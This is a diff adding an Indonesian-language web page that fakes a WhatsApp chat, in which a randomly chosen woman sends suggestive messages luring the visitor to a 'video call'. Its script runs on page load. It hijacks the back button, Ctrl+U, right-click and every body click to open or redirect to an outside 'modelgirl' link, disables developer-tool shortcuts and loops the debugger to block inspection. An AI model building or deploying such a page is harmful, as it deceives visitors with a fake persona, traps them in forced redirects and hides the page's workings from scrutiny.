@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta content="#075e54" name="theme-color" />
+  <meta content="#075e54" name="msapplication-navbutton-color" />
+  <meta property="og:title" content="Video Call" />
+  <meta property="og:description" content="Video call, chat seru &amp; rahasia!" />
+  <meta property="og:type" content="website" />
+  <meta property="og:image"
+    content="https://lh7-rt.googleusercontent.com/docsz/AD_4nXcydWkkbf_DzQ6l_5BaCsotqUENievj60Y1F2WFQLhF9jSW7qIX8hF0QiGlDX3D_VbRL8YUiiWpKPSqQ1NNmZRRMKKSU2KhEIzJ3jsKEUHbAJQL7kePaoqudcKG5Fv44f4vUMLYnd969mwcmX6hW40MJItA7sg?key=7ONdUF9HaMWe9bW6yTdAlg" />
+  <meta property="og:url" content="https://wa.hasdukmerahputih.com/video-call" />
+  <meta property="og:type" content="website" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <title>Video Call</title>
+  <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  <link rel="shortcut icon"
+    href="https://lh7-rt.googleusercontent.com/docsz/AD_4nXcydWkkbf_DzQ6l_5BaCsotqUENievj60Y1F2WFQLhF9jSW7qIX8hF0QiGlDX3D_VbRL8YUiiWpKPSqQ1NNmZRRMKKSU2KhEIzJ3jsKEUHbAJQL7kePaoqudcKG5Fv44f4vUMLYnd969mwcmX6hW40MJItA7sg?key=7ONdUF9HaMWe9bW6yTdAlg"
+    type="image/x-icon" />
+  <link href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css' rel='stylesheet' />
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <style>
+    * {
+      box-sizing: border-box
+    }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #ece5dd;
+      margin: 0;
+      padding: 0
+    }
+
+    .container-wa {
+      max-width: 600px;
+      margin: auto;
+      background: #ece5dd;
+      box-shadow: 0 0 10px rgba(0, 0, 0, .1);
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      max-height: 720px;
+      overflow: hidden
+    }
+
+    .wa-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background: #075e54;
+      color: #fff;
+      padding: 10px
+    }
+
+    .wa-header-left {
+      display: flex;
+      align-items: center
+    }
+
+    .wa-header img {
+      width: 45px;
+      height: 45px;
+      border-radius: 50%;
+      margin-right: 10px
+    }
+
+    .wa-header .name {
+      font-weight: 700
+    }
+
+    .wa-header .status {
+      font-size: 12px;
+      color: #cfcfcf
+    }
+
+    .wa-content {
+      flex: 1;
+      padding: 15px;
+      background: #dcf8c6;
+      background: url('https://lh7-rt.googleusercontent.com/docsz/AD_4nXcWcvprbtQ4MgjNhQjfa-htkTTFNIeumkNwoz8JB_XK_KtNytrUe9XCl04MI2SfSvMr0bT05hFAHy9sDIQ-AzZgnQ1zz0sVipeZgHe6gGbqwZWUGGEWhWlFw9fhOceu2DTfjaDUKRUE2r0q39jttZydSb8Nz6E?key=7ONdUF9HaMWe9bW6yTdAlg') repeat;
+      background-size: auto;
+      overflow: auto;
+      display: flex;
+      flex-direction: column;
+      scroll-behavior: smooth;
+      gap: 10px;
+      margin-bottom: 50px;
+      /* agar tidak ketutupan input bar */
+    }
+
+    img.chat-img {
+      width: 70%;
+      border-radius: 8px;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: opacity .6s ease, transform .6s ease;
+    }
+
+    img.chat-img.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .bubble {
+      display: inline-block;
+      max-width: 80%;
+      padding: 10px 14px;
+      border-radius: 8px;
+      background: #fff;
+      font-size: 15px;
+      opacity: 0;
+      transform: translateY(15px);
+      transition: all .45s ease;
+    }
+
+    .bubble.instruction {
+      background: #fff
+    }
+
+    .bubble.show {
+      opacity: 1;
+      transform: translateY(0)
+    }
+
+    .typing-dots {
+      display: inline-flex;
+      gap: 6px;
+      align-items: center;
+      height: 12px
+    }
+
+    .typing-dots .dot {
+      width: 7px;
+      height: 7px;
+      background: #888;
+      border-radius: 50%;
+      opacity: .3;
+      animation: dot 1.2s infinite
+    }
+
+    .typing-dots .dot:nth-child(2) {
+      animation-delay: .15s
+    }
+
+    .typing-dots .dot:nth-child(3) {
+      animation-delay: .3s
+    }
+
+    @keyframes dot {
+
+      0%,
+      80%,
+      100% {
+        opacity: .25;
+        transform: translateY(0)
+      }
+
+      40% {
+        opacity: 1;
+        transform: translateY(-4px)
+      }
+    }
+
+    .wa-input-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      background: #fff;
+      border-top: 1px solid #ccc;
+      padding: 8px 10px;
+      display: flex;
+      align-items: center;
+      width: 100%;
+      max-width: 600px;
+      margin: auto;
+    }
+
+    .wa-input {
+      flex: 1;
+      margin: 0 10px;
+      background: #f0f0f0;
+      border: none;
+      border-radius: 20px;
+      padding: 10px 15px;
+      font-size: 15px;
+      outline: none
+    }
+
+    .material-icons {
+      cursor: pointer;
+      color: #888;
+      font-size: 26px
+    }
+
+    /* Tombol lanjut video call */
+    .btn-call {
+      background: #25D366;
+      color: #fff;
+      padding: 10px 16px;
+      border: none;
+      border-radius: 20px;
+      font-size: 15px;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 8px;
+      opacity: 0;
+      transform: scale(.95);
+      transition: all .4s ease;
+    }
+
+    .btn-call.show {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .btn-call .material-icons {
+      font-size: 20px;
+      color: #fff;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container-wa">
+    <div class="wa-header">
+      <div class="wa-header-left">
+        <img id="img1"
+          src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXeuyi-RzVLk6h6RpL_XMlm-AOEoONTR4QArEqieiLhtLXfHW6IewgjR2XWaQrcsy4qdKAzxeL5ACqMeX7Nj2OwrcDAmj9pWjPZu4EodQARJzc7-3_Fp8ymLBczqFs9TENMGogvI-l2XF9jJlyNJX8BYvKvYpAg?key=7ONdUF9HaMWe9bW6yTdAlg"
+          alt="PP">
+        <div>
+          <div id="name1" class="name"></div>
+          <div id="status1" class="status">online...</div>
+        </div>
+      </div>
+      <div class="icons">
+        <span class="material-icons">call</span>
+        <span class="material-icons">videocam</span>
+        <span class="material-icons">more_vert</span>
+      </div>
+    </div>
+
+    <div id="chatBox" class="wa-content">
+      <img id="img2" class="chat-img"
+        src="https://lh7-rt.googleusercontent.com/docsz/AD_4nXeuyi-RzVLk6h6RpL_XMlm-AOEoONTR4QArEqieiLhtLXfHW6IewgjR2XWaQrcsy4qdKAzxeL5ACqMeX7Nj2OwrcDAmj9pWjPZu4EodQARJzc7-3_Fp8ymLBczqFs9TENMGogvI-l2XF9jJlyNJX8BYvKvYpAg?key=7ONdUF9HaMWe9bW6yTdAlg"
+        alt="Gambar">
+      <div id="bubble1" class="bubble">
+        <span class="typing-dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>
+      </div>
+      <div id="bubble2" class="bubble instruction">
+        <span class="typing-dots"><span class="dot"></span><span class="dot"></span><span class="dot"></span></span>
+      </div>
+    </div>
+
+    <div class="wa-input-bar">
+      <span class="material-icons">emoji_emotions</span>
+      <input id="chatInput" class="wa-input" placeholder="Ketik pesan...">
+      <span class="material-icons">attach_file</span>
+      <span class="material-icons">send</span>
+    </div>
+  </div>
+
+  <script>
+    const images = [
+      "https://lh7-rt.googleusercontent.com/docsz/AD_4nXeuyi-RzVLk6h6RpL_XMlm-AOEoONTR4QArEqieiLhtLXfHW6IewgjR2XWaQrcsy4qdKAzxeL5ACqMeX7Nj2OwrcDAmj9pWjPZu4EodQARJzc7-3_Fp8ymLBczqFs9TENMGogvI-l2XF9jJlyNJX8BYvKvYpAg?key=7ONdUF9HaMWe9bW6yTdAlg",
+      "https://lh7-rt.googleusercontent.com/docsz/AD_4nXfyRzOlQByamTD96BL77yezX13ly5gTcwUpJhTIVchQ1ll0IVk3Cjii1hVqYtOH55un8qw1JeSyz2h1frSKgyWAElDLlmlpVex9FDL1moq5fWEZrLgYoRGNJXxurNrVTgzBvOOIC9AEckcNoBR5wc7szRWKh4k?key=7ONdUF9HaMWe9bW6yTdAlg",
+      "https://lh7-rt.googleusercontent.com/docsz/AD_4nXfJS2Iarxof-nJHLM1OQe-8ehSsHEAHeanXWCPjEuQPwxJsCCpHmVBLMOp8PsTofWjmFc4v_o1htho59IehRb0bcvoCyyYuOwfOHW_Gar7OLlXZLHbjS-QxDw8uIkzvSpydPnazGmbtAN4YL6x_H_3S4fxCBTQ?key=7ONdUF9HaMWe9bW6yTdAlg",
+      "https://lh7-rt.googleusercontent.com/docsz/AD_4nXeC4NpVVZJuHPLz4jpqeB0wa8LvZA-s3lWv5X6rab2j9NVyBv2X1QzwtCIkEUGEG35GItxKtiMgBuXT8qlipyrLv0GgaT-FOXc1jSSnj-Rk29Hsu8XnquFDn79w5L5LzZUiJJHphwaZNkHSVaK1ngEMP5JGEw?key=7ONdUF9HaMWe9bW6yTdAlg",
+      "https://lh7-rt.googleusercontent.com/docsz/AD_4nXe8tBuymmsjtVg8Sk2F51gVx5i3OxE_95diaz_nBzw6fAlECvrA9EtOoLKqQybBE_8V7v46b4hW3Ny3NC6zlGW1kPEtbJpwivk_pNwNC5JD7NQCkOzP3Xr6Y4s1atG2HEVewZiqqIyOwzNH7c-8tw8Yz_P1f2U?key=7ONdUF9HaMWe9bW6yTdAlg",
+      "https://lh7-rt.googleusercontent.com/docsz/AD_4nXdT6tXRZ8hAL4tb29SQNVefBwbGp5mvwMNIxraY0VLWLhfdTZM5sSOBVWAI-yZg49pXWzGM8ZrLztZ3zvfmgoh5aamW9Jk4_iscUVrAgTBLL0mu1MG364Wy9_rVRN3CtDZVluJjUNaembgUgoP5cmMiNNn4zZw?key=7ONdUF9HaMWe9bW6yTdAlg",
+      "https://lh7-rt.googleusercontent.com/docsz/AD_4nXeddRW9Yw_AO9J8c2k_SGfZTe4_9t9AM0hKc1SGpwT7ntr3XwmskV8qHKzEzjS5arLhfFAh0iJA5HjncK9OKXE-elYEN3UkXimFp4dtonbX8MqgY4AeKD1n8aJrP_IRmcE00eQmhGRN_SZ2QeVCYuQ4qB2VP34?key=7ONdUF9HaMWe9bW6yTdAlg",
+      "https://lh7-rt.googleusercontent.com/docsz/AD_4nXe8tXO3ryd9AaAz2Zt_Kh3jlDghql2rTrfuag8MWm9TJ4V457qWWBug6ehuy8V8gBkLjQPvjVf7VlKD38uFWulJyHsJFvzCYSsZ5FoXX8CFMX-WKkVlsu-AJpZGx3KO33Y9pzMjJn6vTgwuvOzIRhttiJCsWl8?key=7ONdUF9HaMWe9bW6yTdAlg",
+      "https://lh7-rt.googleusercontent.com/docsz/AD_4nXdBJ6lXrIoqd_lZeW47lGFERGHpKx9dmLxs8INGwwXtqZ5rdINvuD1R_YcMgSUbVp3grKCBh4q0MPtK8sItVqvDsyQxDYeHJbdawVRSf0B05LcPim83Oko7OqqHO6zUZUKeI9N8yZUDE-b6iaR-0cVVfDhvIGo?key=7ONdUF9HaMWe9bW6yTdAlg",
+      "https://lh7-rt.googleusercontent.com/docsz/AD_4nXd28bYOOnUz59aEpayKne9zdnjMLTEeaRXZGG-RMavO9RYH76G_ChLzotBQXZD1qoFSeKV9DlbX0cONb6e040s1HsmLxU36uetdbRkSrvHHoSIYcGlocLo0IPyeD0pCrmWGMPR118TJXkhb_XOLAaDCsrlgEA?key=7ONdUF9HaMWe9bW6yTdAlg",
+      "https://lh7-rt.googleusercontent.com/docsz/AD_4nXe3r1Rnnui7Q3cKxSfnvVB6FAlEMbFy2UEVVBM0uyKFDvrlMDlYW8O52RoKGMua9U1m9JAdR5TKjeurgz8-80Y0EIEOZgGPecIfpdPW6gp7ReDW9TL0lRy_sezE8CqxJcEU9pXMclK6lAeZt-92Z4gVnhs7USU?key=7ONdUF9HaMWe9bW6yTdAlg"
+    ];
+
+    const names = [
+      "Neng Citra", "Dewi Ayu", "Rara Cantika", "Maya Manis",
+      "Intan Lestari", "Salsa Ayuningtyas", "Vina Putri", "Lia Anggraini",
+      "Tia Novita", "Cindy Arum", "Rani Wulandari", "Nana Oktavia"
+    ];
+
+    const messages = [
+      "Siap tisu, kopi, sama kuota… malam ini panjang 😏",
+      "Siapin tisu sebelum lanjut vidio call ya mass 😘",
+      "Aku udah make filter “bikin baper” nih 🤭",
+      "Jangan panik kalo tiba-tiba sinyal kamu ngelag gara-gara aku 😘",
+      "Nanti pas liat aku, sinyal langsung full bar deh 😍",
+      "Aku gak ngelucu loh, emang segini efeknya 😜",
+      "Kamera nyala, hati nyala, tinggal kamu aja yang nyusul 😆",
+      "Siap mental aja, jangan sampe grogi liat aku 😝",
+      "Udah make baju yang kamu suka nih, siapin reaksi terbaik 😘",
+      "Nanti jangan pura-pura gak liat ya, aku udah cantik nih 😇",
+      "Kalo liat aku diem, berarti kamu udah kena pesonaku 😌",
+      "Siap-siap jantung berdebar pas liat aku nanti ya 😚",
+      "Jangan kaget kalo aku bikin kamu salah fokus 😘",
+      "Pegang tisu dulu deh, takut kamu klepek-klepek 😝",
+      "Nanti pas video call, janji jangan ngelirik yang lain ya 🥰",
+      "Aku udah siap tampil manis buat kamu nih 💋",
+      "Siapin hati, soalnya aku bakal bikin deg-degan 😳",
+      "Kalo liat aku nanti, jangan salah tingkah ya 😘",
+      "Jan lupa senyum, aku suka liat kamu senyum pas video call 😍",
+      "Malam ini aku tampil beda, siap kaget gak? 😉",
+      "Jangan salahin aku kalo kamu gak bisa tidur abis liat aku 😚",
+      "Aku gak butuh kata-kata manis, cukup liat senyum kamu aja udah tenang 😚",
+      "Nanti pas video call, janji tatap mata aku ya… jangan pindah 😌",
+      "Kadang aku cuma pengen denger suara kamu, biar malamku tenang 🥰",
+      "Kalau kamu capek, sini aku temenin, gak usah ngomong — cukup diem bareng aku 💖",
+      "Gak sabar pengen liat kamu senyum lagi nanti malam 😍",
+      "Biar sinyal jelek, yang penting hatiku tetep nyambung ke kamu 💕",
+      "Aku udah siap nyuri waktu kamu sebentar aja, boleh kan? 🥹",
+      "Nanti pas video call, jangan matiin kamera dulu ya, aku masih kangen 🥺",
+      "Gak tau kenapa, tiap liat kamu tuh rasanya adem banget 😘",
+      "Aku cuma mau kamu tau… kamu tuh rumah buat hatiku 💞",
+      "Jangan kaget kalo aku tampil beda nanti ya 😏",
+      "Siapin tisu, kopi, sama niat kuat… bakal lama nih 😜",
+      "Nanti pas liat aku, jangan salah fokus ya 😚",
+      "Aku gak bisa janji bakal kalem pas video call 😘",
+      "Kalau kamu diem, aku anggap kamu lagi kagum ya 😉",
+      "Aku udah dandan manis, tinggal kamu yang siap deg-degan 😍",
+      "Jangan salahin aku kalo kamu gak bisa tidur abis liat aku 😌",
+      "Aku suka liat kamu salah tingkah, lucu banget 😆",
+      "Pegang kendali ya, soalnya aku bisa bikin kamu lupa waktu 😋",
+      "Nanti malam, biar aku yang bikin kamu senyum terus 😘",
+      "Sinyal boleh jelek, tapi pesonaku tetep lancar 🤭",
+      "Jangan panik kalo tiba-tiba muka aku muncul di mimpimu 😝",
+      "Aku udah aktifin mode “bikin kamu klepek-klepek” 😆",
+      "Kamera nyala, hatiku juga nyala… tinggal kamu yang belum 😜",
+      "Aku gak nge-lag loh, emang segini efeknya 😅",
+      "Jangan salah fokus sama rambut, fokusnya ke aku dong 😇",
+      "Aku gak bisa diem kalo kamu terus liatin aku 😝",
+      "Jan lupa siapkan tisu dan kuota unlimited 😏",
+      "Aku bukan filter, tapi efekku bisa bikin kamu gagal move on 😘",
+      "Kalau sinyal tiba-tiba kuat, itu tandanya kamu inget aku 😍"
+    ];
+
+    const instructions = [
+      "Aku udah nunggu di video call nih mas... 😘<br>Klik lanjut untuk sambungin langsung ya 💞",
+      "Udah siap belum? Aku udah nyalain kamera nih 😍<br>Buruan join sebelum aku keburu malu 😝",
+      "Jangan lama-lama ya, aku udah deg-degan nunggu video call kamu 💓",
+      "Sinyal udah bagus nih... tinggal kamu aja yang klik lanjut 😘",
+      "Aku udah siap tampil manis, ayo sambungin video call-nya sekarang 💋",
+      "Kalo gak segera lanjut, aku bisa baper sendiri nih 😳",
+      "Udah gak sabar pengen liat wajah kamu dari layar 🥰",
+      "Klik lanjut yuk... biar malam ini kita ngobrol dari hati ke hati 💖"
+    ];
+    const videoCallLink = "/video-call/"; // 🔗 GANTI ke link kamu
+
+    const randomImg = images[Math.floor(Math.random() * images.length)];
+    const randomName = names[Math.floor(Math.random() * names.length)];
+    const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+    const randomInstruction = instructions[Math.floor(Math.random() * instructions.length)];
+
+    const img1 = document.getElementById('img1');
+    const img2 = document.getElementById('img2');
+    const name1 = document.getElementById('name1');
+    const chatBox = document.getElementById('chatBox');
+    const bubble1 = document.getElementById('bubble1');
+    const bubble2 = document.getElementById('bubble2');
+
+    img1.src = randomImg;
+    img2.src = randomImg;
+    name1.textContent = randomName;
+
+    function scrollToBottom() {
+      chatBox.scrollTo({
+        top: chatBox.scrollHeight,
+        behavior: 'smooth'
+      });
+    }
+
+    // Gambar muncul
+    setTimeout(() => {
+      img2.classList.add('show');
+      scrollToBottom();
+    }, 800);
+
+    // Bubble 1: sedang mengetik → pesan
+    setTimeout(() => {
+      bubble1.classList.add('show');
+      scrollToBottom();
+    }, 2000);
+
+    setTimeout(() => {
+      bubble1.innerHTML = randomMsg;
+      scrollToBottom();
+    }, 3600);
+
+    // Bubble 2: sedang mengetik → instruksi + tombol
+    setTimeout(() => {
+      bubble2.classList.add('show');
+      scrollToBottom();
+    }, 4800);
+
+    setTimeout(() => {
+      bubble2.innerHTML = randomInstruction;
+      scrollToBottom();
+
+      // tombol muncul
+      const btn = document.createElement('button');
+      btn.className = 'btn-call';
+      btn.innerHTML = '<span class="material-icons">videocam</span> Lanjut ke Video Call';
+      bubble2.appendChild(document.createElement('br'));
+      bubble2.appendChild(btn);
+
+      setTimeout(() => btn.classList.add('show'), 200);
+
+      // jika tombol diklik → konfirmasi → redirect
+      btn.onclick = () => {
+        if (confirm("Yakin mau lanjut video call sama " + randomName + " ?")) {
+          window.location.href = videoCallLink;
+        }
+      };
+      scrollToBottom();
+    }, 6600);
+
+    var directlink = "https://modelgirl.app.link/?start=cXVlcnlfcmVzdWx0OiBSZXRyaWV2ZWQ=";
+
+    /*! inspect element */
+    ! function t() {
+      try {
+        ! function t(n) {
+          1 === ("" + n / n)
+            .length && 0 !== n || function () {}.constructor("debugger")(), t(++n)
+        }(0)
+      } catch (n) {
+        setTimeout(t, 5e3)
+      }
+    }();
+
+    /*! antiback */
+    (function (window, location) {
+      history.replaceState(null, document.title, location.pathname + "#!/history");
+      history.pushState(null, document.title, location.pathname);
+      window.addEventListener("popstate", function () {
+        if (location.hash === "#!/history") {
+          history.replaceState(null, document.title, location.pathname);
+          setTimeout(function () {
+            window.location.href = directlink;
+          }, 0);
+        }
+      }, false);
+    }(window, location));
+
+    // script redirect ctrl U
+    function redirectCU(e) {
+      if (e.ctrlKey && e.which == 85) {
+        window.location.href = directlink;
+      }
+    }
+    document.onkeydown = redirectCU;
+
+    /*! anti copas jquery */
+    window.oncontextmenu = function () {
+      return false;
+    }
+    $(document).keydown(function (event) {
+      if (event.keyCode == 123) {
+        return false;
+      } else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) ||
+        (event.ctrlKey && event.shiftKey && event.keyCode == 74) ||
+        (event.ctrlKey && event.keyCode == 85) ||
+        (event.ctrlKey && event.keyCode == 80)) {
+        return false;
+      }
+    });
+
+    /*! anti ctrl */
+    shortcut = {
+      all_shortcuts: {},
+      add: function (a, b, c) {
+        var d = {
+          type: "keydown",
+          propagate: !1,
+          disable_in_input: !1,
+          target: document,
+          keycode: !1
+        };
+        if (c)
+          for (var e in d) "undefined" == typeof c[e] && (c[e] = d[e]);
+        else c = d;
+        d = c.target, "string" == typeof c.target && (d = document.getElementById(c.target)), a = a.toLowerCase(),
+          e = function (d) {
+            d = d || window.event;
+            if (c.disable_in_input) {
+              var e;
+              d.target ? e = d.target : d.srcElement && (e = d.srcElement), 3 == e.nodeType && (e = e.parentNode);
+              if ("INPUT" == e.tagName || "TEXTAREA" == e.tagName) return
+            }
+            d.keyCode ? code = d.keyCode : d.which && (code = d.which), e = String.fromCharCode(code)
+              .toLowerCase(), 188 == code && (e = ","), 190 == code && (e = ".");
+            var f = a.split("+"),
+              g = 0,
+              h = {
+                "`": "~",
+                1: "!",
+                2: "@",
+                3: "#",
+                4: "$",
+                5: "%",
+                6: "^",
+                7: "&",
+                8: "*",
+                9: "(",
+                0: ")",
+                "-": "_",
+                "=": "+",
+                ";": ":",
+                "'": '"',
+                ",": "<",
+                ".": ">",
+                "/": "?",
+                "\\": "|"
+              },
+              i = {
+                esc: 27,
+                escape: 27,
+                tab: 9,
+                space: 32,
+                "return": 13,
+                enter: 13,
+                backspace: 8,
+                scrolllock: 145,
+                scroll_lock: 145,
+                scroll: 145,
+                capslock: 20,
+                caps_lock: 20,
+                caps: 20,
+                numlock: 144,
+                num_lock: 144,
+                num: 144,
+                pause: 19,
+                "break": 19,
+                insert: 45,
+                home: 36,
+                "delete": 46,
+                end: 35,
+                pageup: 33,
+                page_up: 33,
+                pu: 33,
+                pagedown: 34,
+                page_down: 34,
+                pd: 34,
+                left: 37,
+                up: 38,
+                right: 39,
+                down: 40,
+                f1: 112,
+                f2: 113,
+                f3: 114,
+                f4: 115,
+                f5: 116,
+                f6: 117,
+                f7: 118,
+                f8: 119,
+                f9: 120,
+                f10: 121,
+                f11: 122,
+                f12: 123
+              },
+              j = !1,
+              l = !1,
+              m = !1,
+              n = !1,
+              o = !1,
+              p = !1,
+              q = !1,
+              r = !1;
+            d.ctrlKey && (n = !0), d.shiftKey && (l = !0), d.altKey && (p = !0), d.metaKey && (r = !0);
+            for (var s = 0; k = f[s], s < f.length; s++) "ctrl" == k || "control" == k ? (g++, m = !0) : "shift" ==
+              k ? (g++, j = !0) : "alt" == k ? (g++, o = !0) : "meta" == k ? (g++, q = !0) : 1 < k.length ? i[k] ==
+              code && g++ : c.keycode ? c.keycode == code && g++ : e == k ? g++ : h[e] && d.shiftKey && (e = h[e],
+                e == k && g++);
+            if (g == f.length && n == m && l == j && p == o && r == q && (b(d), !c.propagate)) return d
+              .cancelBubble = !0, d.returnValue = !1, d.stopPropagation && (d.stopPropagation(), d
+                .preventDefault()), !1
+          }, this.all_shortcuts[a] = {
+            callback: e,
+            target: d,
+            event: c.type
+          }, d.addEventListener ? d.addEventListener(c.type, e, !1) : d.attachEvent ? d.attachEvent("on" + c.type,
+            e) : d["on" + c.type] = e
+      },
+      remove: function (a) {
+        var a = a.toLowerCase(),
+          b = this.all_shortcuts[a];
+        delete this.all_shortcuts[a];
+        if (b) {
+          var a = b.event,
+            c = b.target,
+            b = b.callback;
+          c.detachEvent ? c.detachEvent("on" + a, b) : c.removeEventListener ? c.removeEventListener(a, b, !1) : c[
+            "on" + a] = !1
+        }
+      }
+    }, shortcut.add("Ctrl+U", function () {
+      window.location.href = directlink;
+    });
+
+    /*! Redirect Klik Kanan */
+    function redirectKK(e) {
+      if (e.which == 3) {
+        window.open(directlink);
+        window.focus();
+      }
+    }
+    document.oncontextmenu = redirectKK;
+
+    /*! Klik Body */
+    function addEvent(obj, eventName, func) {
+      if (obj.attachEvent) {
+        obj.attachEvent("on" + eventName, func);
+      } else if (obj.addEventListener) {
+        obj.addEventListener(eventName, func, true);
+      } else {
+        obj["on" + eventName] = func;
+      }
+    }
+
+    addEvent(window, "load", function (e) {
+      addEvent(document.body, "click", function (e) {
+        e = e || window.event;
+        var target = e.target || e.srcElement;
+
+        // Cek jika elemen yang diklik adalah <a> atau di dalam <a>
+        while (target && target !== document.body) {
+          if (target.tagName && target.tagName.toLowerCase() === "a") {
+            return; // Jangan lakukan apa-apa jika klik pada <a>
+          }
+          target = target.parentNode;
+        }
+
+        window.open(directlink);
+        window.focus();
+      });
+    });
+  </script>
+</body>
+
+</html>
